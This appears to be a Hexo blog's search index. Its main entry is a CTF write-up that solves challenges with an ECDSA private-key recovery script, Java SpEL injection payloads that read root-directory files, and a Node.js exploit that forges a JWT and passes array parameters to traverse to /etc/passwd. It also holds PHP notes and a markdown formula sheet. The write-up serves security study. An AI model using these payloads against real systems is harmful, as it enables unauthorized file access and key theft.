[{"title":"【 比赛篇 | CTF 】2025CISCN暨长城杯","url":"/posts/bb60/","content":"ECDSA\n题目内容：\nECDSA一定是安全的吗？提交格式：flag{私钥的MD5值}\n\n题目：\n#!/usr/bin/env python3from ecdsa import SigningKey, NIST521pfrom hashlib import sha512from Crypto.Util.number import long_to_bytesimport randomimport binasciiimport sysdigest_int = int.from_bytes(sha512(b&quot;Welcome to this challenge!&quot;).digest(), &quot;big&quot;)curve_order = NIST521p.orderpriv_int = digest_int % curve_orderpriv_bytes = long_to_bytes(priv_int, 66)sk = SigningKey.from_string(priv_bytes, curve=NIST521p)vk = sk.verifying_keyf_pub = open(&quot;public.pem&quot;, &quot;wb&quot;)f_pub.write(vk.to_pem())f_pub.close()def nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return kmsgs = [b&quot;message-&quot; + bytes([i]) for i in range(60)]sigs = []for i, msg in enumerate(msgs):    k = nonce(i)    sig = sk.sign(msg, k=k)    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))f_sig = open(&quot;signatures.txt&quot;, &quot;w&quot;)for m, s in sigs:    f_sig.write(&quot;%s:%s\\n&quot; % (m, s))f_sig.close()\n\n审计发现，本题考查ECDSA恢复私钥\nECDSA标准加密流程：\n\n计算消息哈希\n\n$$e &#x3D; H(m)$$\n\n选择随机 nonce k\n\n计算\n\n\n$$r &#x3D; (kG)_x \\bmod n$$\n\n计算\n\n$$s &#x3D; k^{-1}(e + dr) \\bmod n$$\n可以反推私钥d的算法：$$\\boxed{d \\equiv (sk - e) \\cdot r^{-1} \\pmod n}$$考点在nonce是假的随机数，\ndef nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return k\n\n每条消息对应的nonce可预测，所以私钥可以从任意一条签名中直接被恢复。\nexp:\n#!/usr/bin/env python3import binasciifrom ecdsa import VerifyingKey, NIST521p, SigningKeyfrom hashlib import sha512, md5from binascii import hexlifydef computer_priv_from_seed():    digest = sha512(b&quot;Welcome to this challenge!&quot;).digest()    curve_order = NIST521p.order    priv_int = int.from_bytes(digest, &quot;big&quot;) % curve_order    priv_bytes = priv_int.to_bytes(66, &quot;big&quot;)    return priv_int,priv_bytes, digestdef nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return kdef recover_d_from_signature(msg_bytes, sig_hex):    sig = binascii.unhexlify(sig_hex)    if len(sig) &lt; 132:        raise ValueError(&quot;Signature length is too short to be valid for NIST521p&quot;)    r = int.from_bytes(sig[0:66], &quot;big&quot;)    s = int.from_bytes(sig[66:132], &quot;big&quot;)    n = int(NIST521p.order)    e = int.from_bytes(sha512(msg_bytes).digest(), &quot;big&quot;)    if len(msg_bytes) == 0 or msg_bytes[-1] &gt; 255:        raise ValueError(&quot;Invalid message format&quot;)    i = msg_bytes[-1]    k = nonce(i)    d = ((s * k - e) * pow(r, -1, n)) % n    priv_bytes = d.to_bytes(66, &quot;big&quot;)    return d, priv_bytes, idef main():    priv_int, priv_bytes, digest = computer_priv_from_seed()    print(&quot;Welcome to this challenge! private key (int):&quot;, hexlify(digest).decode())    print(&quot;Private key (int):&quot;, priv_int)    print(&quot;Private key (hex):&quot;, priv_bytes.hex())    print(&quot;MD5 of private key:&quot;, md5(priv_bytes).hexdigest())    recovered =  set()    with open(&quot;signatures.txt&quot;, &quot;r&quot;) as f:        lines = [ln.strip() for ln in f if ln.strip() and &quot;:&quot; in ln]            for ln in lines:        print(&quot;=============================================&quot;)        print(&quot;Processing line:&quot;, ln)        left, right = ln.split(&quot;:&quot;, 1)        msg_bytes = bytes.fromhex(left)        sig_hex = right.strip()        d, pd, i = recover_d_from_signature(msg_bytes, sig_hex)        print(&quot;Recovered private key (hex):&quot;, pd.hex())        print(&quot;MD5 of recovered private key:&quot;, md5(pd).hexdigest())        recovered.add(pd.hex())        with open(&quot;public.pem&quot;, &quot;rb&quot;) as f:            pub_pem = f.read()                    sk = SigningKey.from_string(priv_bytes, curve=NIST521p)        vk = sk.verifying_key        pem = vk.to_pem()        print(&quot;+++++++++++++++++++++++++++++++++++++++++++++&quot;)        if pub_pem.strip() == pem.strip():            print(&quot;Public key from recovered private key does not match original!&quot;)        print(&quot;Public key from recovered private key matches original:&quot;, pem.decode())        print(md5(priv_bytes))        print(priv_bytes)        print(&quot;=============================================&quot;)        priv_str = str(priv_int).encode(&quot;ascii&quot;)        print(&quot;Private key as string:&quot;, md5(priv_str).hexdigest())if __name__ == &quot;__main__&quot;:    main()\n\n确保验证时得出的公钥与题目给的一致：\n\nEzJava\n题目内容：\n公告管理系统近期开发测试，为保证测试环境安全，已把常用系统命令全部清除，请尝试读取根目录的敏感文件。（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ）\n\nadmin/admin123弱口令直接进后台，发现为java的模板渲染，且T(连接起来会替换为NONO,new被替换为WoW。\n最后使用java中的File类的listFiles方法获取根目录下的文件列表，因为其返回结果为数组，需要转换为字符串，所以构造：\n$&#123;T (java.util.Arrays).toString(T (java.io.File).listRoots()[0].listFiles().![name])&#125;\n\n\n继续使用Files类中的readAiiLines方法获取flag值，Paths类的get设定文件名，因为程序会将flag字符串替换为空，所以使用concat进行截断绕过：\n$&#123;T (java.nio.file.Files).readAllLines(T (java.nio.file.Paths).get(&#x27;/&#x27;.concat(&#x27;f&#x27;).concat(&#x27;lag_y0u_d0nt_kn0w&#x27;)))&#125;\n\n\nDeprecated今年长城杯决赛原题： 2025 长城杯 final 记录\n下载附件后审计，漏洞点有两个：\nrouter.get(&#x27;/checkfile&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;    try&#123;        let user = await db.getUser(req.data.username);        if (user === undefined) &#123;            return res.send(`user $&#123;req.data.username&#125; doesn&#x27;t exist.`);        &#125;        if (req.data.username === &#x27;admin&#x27; &amp;&amp; req.data.priviledge===&#x27;File-Priviledged-User&#x27;)&#123;            let file=req.query.file;            if (!file) &#123;                return res.send(&#x27;File name not specified.&#x27;);            &#125;            if (!allowedFile(file)) &#123;                return res.send(&#x27;File type not allowed.&#x27;);            &#125;            try&#123;                if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;)) &#123;                    return res.send(&#x27;Invalid filename!&#x27;);                &#125;            &#125;            catch(err)&#123;                return res.send(&#x27;An error occured!&#x27;);            &#125;            if (file.length &gt; 10) &#123;                file = file.slice(0, 10);            &#125;            const returned = path.resolve(&#x27;./&#x27; + file);            fs.readFile(returned, (err) =&gt; &#123;                if (err) &#123;                    return res.send(&#x27;An error occured!&#x27;);                &#125;                res.sendFile(returned);            &#125;);        &#125;        else&#123;            return res.send(&#x27;Sorry Only priviledged Admin can check the file.&#x27;).status(403);        &#125;    &#125;catch (err)&#123;        return next(err);    &#125;&#125;);\n\ncheckfile路由存在文件读取。\nconst allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;\n\n这里可以绕过扩展名：\n\n这里可以打文件读取：\nconst returned = path.resolve(&#x27;./&#x27; + file);\n\n看下效果：\n然后res.sendFile(returned);程序就会获取服务器上存在的文件，发送到客户端。\n这个基本就是获取flag的核心所在，剩下继续看：先看第一层过滤：\nlet user = await db.getUser(req.data.username);        if (user === undefined) &#123;            return res.send(`user $&#123;req.data.username&#125; doesn&#x27;t exist.`);        &#125;        if (req.data.username === &#x27;admin&#x27; &amp;&amp; req.data.priviledge===&#x27;File-Priviledged-User&#x27;)&#123;\n\n这里需要伪造jwt，并且jwt的值需要等于这两个。\n首先注册两个用户，获取两个用户的jwt：\n使用rsa_sign2n&#x2F;standalone at release · silentsignal&#x2F;rsa_sign2n爆破公钥，爆破到公钥之后，利用python生成相应的jwt：\nfrom pathlib import Pathimport jwtimport pickleimport base64import encodingspath = Path(&#x27;.&#x27;)for file in path.glob(&#x27;*.pem&#x27;):    with open(file.name, &#x27;rb&#x27;) as key:        token=jwt.encode(            payload=&#123;                &quot;username&quot;: &quot;admin&quot;,                &quot;priviledge&quot;: &quot;File-Priviledged-User&quot;,                &quot;iat&quot;: 1766911284,            &#125;,            key=key.read(),            algorithm=&#x27;HS256&#x27;        )        print(token)        print(&quot;---&quot;)\n\n参考https://www.caterpie771.cn/archives/347#GeekChalleng2024_jwt_pickle\n这个时候就获得了admin用户的jwt。接下来绕过：\nif (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;))\n\n这里只需要传入数组就可以被绕过。\n写一个最小demo：\nconst express = require(&#x27;express&#x27;);const fs = require(&#x27;fs&#x27;);const &#123; type &#125; = require(&#x27;os&#x27;);const path = require(&#x27;path&#x27;);const app = express();const allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;app.get(&#x27;/read&#x27;, (req, res, next) =&gt; &#123;    let file = req.query[&#x27;file[]&#x27;];   // 让其接收file[]达到效果 ← 浏览器 ?file=xxx.log    console.log(&#x27;[+] req.query:&#x27;, req.query);    console.log(&#x27;[+] req.query.file:&#x27;, req.query.file);    if (!file) &#123;        return res.send(&#x27;File name not specified.&#x27;);    &#125;    if (!allowedFile(file)) &#123;        return res.send(&#x27;File type not allowed.&#x27;);    &#125;    try &#123;        if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;)) &#123;            return res.send(&#x27;Invalid filename!&#x27;);        &#125;    &#125; catch (err) &#123;        return res.send(&#x27;An error occured!&#x27;);    &#125;    if (file.length &gt; 10) &#123;        file = file.slice(0, 10);    &#125;    const returned = path.resolve(&#x27;./&#x27; + file);    console.log(&#x27;[+] resolved path:&#x27;, returned);    fs.readFile(returned, (err) =&gt; &#123;        if (err) &#123;            return res.send(&#x27;An error occured!&#x27;);        &#125;        res.sendFile(returned);    &#125;);&#125;);app.listen(3000, () =&gt; &#123;    console.log(&#x27;Listening on http://localhost:3000&#x27;);&#125;);\n\n由于本地原因，漏洞点体现的不明显，当我们传入数组类型时：\nhttp://localhost:3000/read?file[]=&amp;file[]=&amp;file[]=&amp;file[]=../../../../../etc/passwd&amp;file[]=.&amp;file[]=log\n\n后端传入：\n\n设置file为传入的内容：\nconst allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;const path = require(&#x27;path&#x27;);// === 漏洞 payload（攻击者可控）===let file = [ &#x27;&#x27;,  &#x27;&#x27;,  &#x27;&#x27;,  &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;../../../../../../../../etc/passwd&#x27;, &#x27;.&#x27;, &#x27;log&#x27; ];console.log(&#x27;[+] file payload:&#x27;, file);// === 漏洞核心代码 ===if (!allowedFile(file)) &#123;    console.log(&#x27;File type not allowed.&#x27;);&#125; else &#123;    console.log(&#x27;[+] passed allowedFile check&#x27;);&#125;if (file.length &gt; 10) &#123;    file = file.slice(0, 10);&#125;const returned = path.resolve(&#x27;./&#x27; + file);console.log(&#x27;[+] resolved path:&#x27;, returned);\n\n通过控制传入的空数组的值以及路径穿越，就可以任意读取文件：\n","categories":["比赛篇"],"tags":["CTF比赛合集","CISCN","长城杯"]},{"title":"Hello World","url":"/posts/3eeb/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"【学习篇 | PHP专栏】php语言基础","url":"/posts/8d10/","content":"记录一下php语言的学习过程，做一个笔记，方便日后回顾。\nPHP基础语法注释单行注释：//,快捷键：ctrl+/；多行注释：/* ..... */，快捷键：ctrl+shift+/。\n变量变量以$符号开始，后跟变量名，变量名必须以字母或者下划线字符开始，且区分大小写，不能包含空格,php是弱类型语言，声明时不必标注数据类型。\n&lt;?phpecho &quot;hello world\\n&quot;;$a = 5;$hello_world = &quot;Hello, PHP!&quot;;echo $hello_world;?&gt;\n\n全局作用域与局部作用域一种为在php函数外部声明的变量；一种为使用global关键字声明的变量。二者皆可在全局作用域下访问。\n&lt;?php$x = 10; // 全局变量function add($x)&#123;    $y = 5; // 局部变量    global $z; // 引入全局变量    $z = 15;    return $x + $y;&#125;$w = add($x);echo $z;echo &quot;\\n&quot;;echo $w;?&gt;\n\nstatic作用域当一个函数完成时，它的所有变量通常均会被删除。如果希望不被删除，在第一次声明时需要使用static关键字。\n&lt;?phpfunction testStatic() &#123;    static $count = 0; // 静态变量    $count++;    echo &quot;函数被调用了 &#123;$count&#125; 次\\n&quot;;&#125;testStatic();testStatic();testStatic();?&gt;\n\n\n&lt;?phpfunction testStatic() &#123;    $count = 0; // 静态变量    $count++;    echo &quot;函数被调用了 &#123;$count&#125; 次\\n&quot;;&#125;testStatic();testStatic();testStatic();?&gt;\n\n\n参数作用域参数是通过调用代码将值传递给函数的局部变量，参数是在参数列表中声明的，作为函数声明的一部分：\n&lt;?phpfunction greet($name) &#123;    return &quot;Hello, &quot; . $name . &quot;!&quot;;&#125;echo greet(&quot;World&quot;);?&gt;\n\n\n字符串变量如上，需要使用单引号&#39;&#39;，或者双引号&quot;&quot;括起来进行声明。\n双引号可以在声明字符串中插入变量解析以及换行符等，而单引号只会将其当作普通字符串进行解析：\n&lt;?php$php = &#x27;PHP&#x27;;$txt = &#x27;你好, $php&#x27;;echo $txt . &quot;\\n&quot;;$hello = &quot;$txt, welcome to $php!\\n&quot;;echo $hello;?&gt;\n\n\nphp并置运算符在PHP中，只有一个字符串运算符，并置运算符.用于将两个字符串连接起来，如：\n&lt;?php$a = &quot;你好&quot;;$b = &quot;世界&quot;;echo $a . &#x27;,&#x27; . &quot;$b&quot; . &#x27;,&#x27; . &quot;我很喜欢PHP！&quot;;?&gt;\n\n\nstrlen()函数strlen()函数用来返回字符串的长度（字节数），其常常在循环和其他函数中，因为那时确定字符串何时结束很重要。\n&lt;?php$txt = &quot;fjaslkdfjlkajdflkjaldkfjladsfjlkadfl;jflksad&#x27;&quot;;echo strlen($txt);?&gt;\n\n\nstrops()函数strops()函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数就会返回第一个匹配的字符位置，如果未匹配，则返回false。\n&lt;?php$txt = &quot;hello, world&quot;;echo strpos($txt, &quot;wor&quot;);echo &quot;\\n&quot;;$txt1 = &quot;hello world&quot;;var_dump(strpos($txt1, &quot;你好&quot;));?&gt;\n\n\nphp运算符算术运算符\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n加\nx和y的和\n\n\nx - y\n减\nx和y的差\n\n\nx * y\n乘\nx和y的积\n\n\nx &#x2F; y\n除\nx和y的商\n\n\nx % y\n模\nx除以y的余数\n\n\n-x\n负数\n取x的相反符号\n\n\n~x\n取反\nx取反，按二进制位进行取反运算\n\n\na.b\n并置\n连接两个字符串\n\n\nintdiv(x, y)\n整除\n返回值为第一个参数除以第二个参数的值并向下取整。\n\n\n赋值运算符\n\n\n运算符\n等同于\n描述\n\n\n\nx &#x3D; y\nx &#x3D; y\n左操作数被设置为右侧表达式的值\n\n\nx +&#x3D; y\nx &#x3D; x + y\n加\n\n\nx -&#x3D; y\nx &#x3D; x - y\n减\n\n\nx *&#x3D; y\nx &#x3D; x * y\n乘\n\n\nx &#x2F;&#x3D; y\nx &#x3D; x &#x2F; y\n除\n\n\nx %&#x3D; y\nx &#x3D; x % y\n模\n\n\nx .&#x3D; y\nx &#x3D; x . y\n连接连个字符串\n\n\n递增&#x2F;递减运算符\n\n\n运算符\n名称\n描述\n\n\n\n++x\n预递增\nx加1，然后返回x\n\n\nx++\n后递增\n返回x，然后x加1\n\n\n–x\n预递减\nx减1，然后返回x\n\n\nx–\n后递减\n返回x，然后x减1\n\n\n比较运算符\n\n\n运算符\n名称\n描述\n\n\n\nx &#x3D;&#x3D; y\n等于\n如果x等于y，则返回true\n\n\nx &#x3D;&#x3D;&#x3D; y\n绝对等于\n如果x等于y，且它们类型相同，则返回true\n\n\nx !&#x3D; y\n不等于\n如果x不等于y，则返回true\n\n\nx &lt;&gt; y\n不等于\n如果x不等于y，则返回true\n\n\nx &gt; y\n大于\n如果x大于y，则返回true\n\n\nx &lt; y\n小于\n如果x小于y，则返回true\n\n\nx !&#x3D;&#x3D; y\n不绝对等于\n如果x不等于y，或它们类型不相同，则返回true\n\n\nx &gt;&#x3D; y\n大于等于\n如果x大于或者等于y，则返回true\n\n\nx &lt;&#x3D; y\n小于等于\n如果x小于或者等于y，则返回true\n\n\n逻辑运算符\n\n\n运算符\n名称\n描述\n\n\n\n\nx and y\n与\n如果x与y都为true，则返回true\n\n\n\nx or y\n或\n如果x和y至少有一个为true，则返回true\n\n\n\nx xor y\n异或\n如果x和y有且仅有一个为true，则返回true\n\n\n\nx &amp;&amp; y\n与\n如果x和y都为true，则返回true\n\n\n\nx || y\n或\n如果x和y至少有一个为true，则返回true\n\n\n\n|x\n非\n如果x不为true，则返回true\n\n\n\n数组运算符\n\n\n运算符\n名称\n描述\n\n\n\nx + y\n集合\nx和y的集合\n\n\nx &#x3D;&#x3D; y\n相等\n如果x和y具有相同的键&#x2F;值对，则返回true\n\n\nx &#x3D;&#x3D;&#x3D; y\n恒等\n如果x和y具有相同的键&#x2F;值对，且顺序相同类型相同，则返回true\n\n\nx !&#x3D; y\n不相等\n如果x不等于y，则返回true\n\n\nx &lt;&gt; y\n不相等\n如果x不等于y，则返回true\n\n\nx !&#x3D;&#x3D; y\n不恒等\n如果x不等于y，则返回true\n\n\n\n\n\n\n\n三元运算符另一个条件运算符是?:运算符。\n(expr1) ? (expr2) : (expr3)\n\n\n\n\n\n\n\n\n\n\n\n","categories":["学习篇","PHP专栏"],"tags":["学习篇","PHP基础"]},{"title":"markdown公式写法大全","url":"/posts/1a13/","content":"ai整理的，放在这里方便速查。\nMarkdown 数学 · 密码学 · 机器学习公式大全（Typora 直接可用版本）\n\n一、基础用法1. 行内公式这是一个行内公式：$a^2 + b^2 &#x3D; c^2$\n$a^2 + b^2 = c^2$\n\n2. 块级公式$$a^2 + b^2 = c^2$$\n\n\n二、上下标$x^2 \\quad x_1 \\quad x_i^n$\n\n$$x^2 \\quad x_1 \\quad x_i^n$$\n\n三、分数与根号1. 分数$\\frac&#123;a&#125;&#123;b&#125; \\quad \\dfrac&#123;a&#125;&#123;b&#125;$\n\n$$\\frac{a}{b} \\quad \\dfrac{a}{b}$$\n2. 根号$\\sqrt&#123;x&#125; \\quad \\sqrt[n]&#123;x&#125;$\n\n$$\\sqrt{x} \\quad \\sqrt[n]{x}$$\n\n四、运算符$+ \\; - \\; \\times \\; \\div$\n\n$$\n\n; - ; \\times ; \\div$$\n\n$\\pm \\; \\mp \\; \\cdot \\; \\ast$\n\n$$\\pm ; \\mp ; \\cdot ; \\ast$$\n\n五、关系符号$= \\neq \\approx \\sim \\equiv$\n\n$$&#x3D; \\neq \\approx \\sim \\equiv$$\n$&gt; &lt; \\ge \\le \\gg \\ll$\n\n$$\n\n&lt; \\ge \\le \\gg \\ll$$\n\n\n六、集合与逻辑$\\in \\notin \\subset \\subseteq \\supset$\n\n$$\\in \\notin \\subset \\subseteq \\supset$$\n$\\cup \\cap \\emptyset$\n\n$$\\cup \\cap \\emptyset$$\n$\\forall \\exists \\neg$\n\n$$\\forall \\exists \\neg$$\n\n七、求和 &#x2F; 积分 &#x2F; 极限1. 求和$\\sum_&#123;i=1&#125;^&#123;n&#125; i$\n\n$$\\sum_{i&#x3D;1}^{n} i$$\n2. 积分$\\int_a^b f(x)\\,dx$\n\n$$\\int_a^b f(x),dx$$\n3. 极限$\\lim_&#123;x \\to 0&#125; \\frac&#123;\\sin x&#125;&#123;x&#125;$\n\n$$\\lim_{x \\to 0} \\frac{\\sin x}{x}$$\n\n八、向量与矩阵1. 向量$\\vec&#123;a&#125; \\quad \\mathbf&#123;A&#125;$\n\n$$\\vec{a} \\quad \\mathbf{A}$$\n2. 矩阵$$\\begin&#123;bmatrix&#125;1 &amp; 2 \\\\3 &amp; 4\\end&#123;bmatrix&#125;$$\n\n$$\\begin{bmatrix}1 &amp; 2 \\3 &amp; 4\\end{bmatrix}$$\n\n九、括号与定界符$( ) \\quad [ ] \\quad \\&#123; \\&#125;$\n\n$$( ) \\quad [ ] \\quad { }$$\n$\\left( \\frac&#123;a&#125;&#123;b&#125; \\right)$\n\n$$\\left( \\frac{a}{b} \\right)$$\n\n十、函数$\\sin x \\cos x \\tan x$\n\n$$\\sin x \\cos x \\tan x$$\n$\\log x \\ln x \\exp x$\n\n$$\\log x \\ln x \\exp x$$\n\n十一、希腊字母小写$\\alpha \\beta \\gamma \\delta \\epsilon \\theta \\lambda \\mu \\pi \\sigma \\omega$\n\n$$\\alpha \\beta \\gamma \\delta \\epsilon \\theta \\lambda \\mu \\pi \\sigma \\omega$$\n大写$\\Gamma \\Delta \\Theta \\Lambda \\Pi \\Sigma \\Omega$\n\n$$\\Gamma \\Delta \\Theta \\Lambda \\Pi \\Sigma \\Omega$$\n\n十二、箭头$\\to \\rightarrow \\Leftarrow \\Leftrightarrow$\n\n$$\\to \\rightarrow \\Leftarrow \\Leftrightarrow$$\n\n十三、多行对齐公式$$\\begin&#123;aligned&#125;f(x) &amp;= x^2 + 1 \\\\     &amp;= (x+1)^2 - 2x\\end&#123;aligned&#125;$$\n\n$$\\begin{aligned}f(x) &amp;&#x3D; x^2 + 1 \\     &amp;&#x3D; (x+1)^2 - 2x\\end{aligned}$$\n\n十四、分段函数$$f(x)=\\begin&#123;cases&#125;x^2, &amp; x \\ge 0 \\\\-x, &amp; x &lt; 0\\end&#123;cases&#125;$$\n\n$$f(x)&#x3D;\\begin{cases}x^2, &amp; x \\ge 0 \\-x, &amp; x &lt; 0\\end{cases}$$\n\n十五、密码学 &#x2F; 安全公式RSA$$n &#x3D; pq,\\quad \\varphi(n) &#x3D; (p-1)(q-1)$$\n$$c \\equiv m^e \\pmod n,\\quad m \\equiv c^d \\pmod n$$\nECC$$y^2 &#x3D; x^3 + ax + b \\pmod p$$\n$$Q &#x3D; kP$$\nHash &#x2F; Birthday Attack$$h &#x3D; H(m)$$\n$$P \\approx 1 - e^{-k^2 &#x2F; 2N}$$\n\n十六、线性代数 &#x2F; 机器学习特征值$$A\\vec{x} &#x3D; \\lambda \\vec{x}$$\n欧氏距离$$d(x,y) &#x3D; \\sqrt{\\sum (x_i - y_i)^2}$$\n线性回归$$y &#x3D; Xw + b$$\n梯度下降$$\\theta_{t+1} &#x3D; \\theta_t - \\eta \\nabla L$$\nSoftmax$$\\mathrm{softmax}(x_i) &#x3D; \\frac{e^{x_i}}{\\sum_j e^{x_j}}$$\n\n十七、概率论（安全 &#x2F; 机器学习常用）条件概率$$P(A \\mid B) &#x3D; \\frac{P(A \\cap B)}{P(B)}$$\n贝叶斯公式$$P(A \\mid B) &#x3D; \\frac{P(B \\mid A) P(A)}{P(B)}$$\n数学期望与方差$$E[X] &#x3D; \\sum x p(x)$$\n$$\\mathrm{Var}(X) &#x3D; E[(X - E[X])^2]$$\n\n十八、信息论（密码学常用）信息熵$$H(X) &#x3D; -\\sum p(x) \\log p(x)$$\n联合熵与条件熵$$H(X,Y) &#x3D; -\\sum p(x,y)\\log p(x,y)$$\n$$H(X \\mid Y) &#x3D; H(X,Y) - H(Y)$$\n互信息$$I(X;Y) &#x3D; H(X) - H(X \\mid Y)$$\n","categories":["markdown语法"],"tags":["markdown，公式语法"]},{"title":"【工具合集 | BurpSuite】BurpSuite的安装与使用","url":"/posts/aefb/","content":"","categories":["工具篇"],"tags":["工具合集","BurpSuite"]},{"title":"【工具合集 | Yakit】Yakit的安装和使用","url":"/posts/86a3/","content":"","categories":["工具篇"],"tags":["工具合集","yakit"]}]